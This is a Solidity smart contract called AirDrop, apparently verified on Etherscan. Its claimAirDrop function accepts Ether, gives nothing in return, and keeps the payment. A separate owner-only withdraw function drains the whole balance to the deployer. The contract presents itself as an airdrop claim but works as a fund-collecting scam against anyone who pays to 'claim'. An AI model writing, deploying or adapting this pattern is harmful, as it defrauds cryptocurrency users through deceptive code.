/**
 *Submitted for verification at Etherscan.io on 2022-10-30
*/

pragma solidity ^0.4.26;

contract AirDrop {

    address private  owner;    // current owner of the contract

    constructor() public{   
        owner = msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function claimAirDrop() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}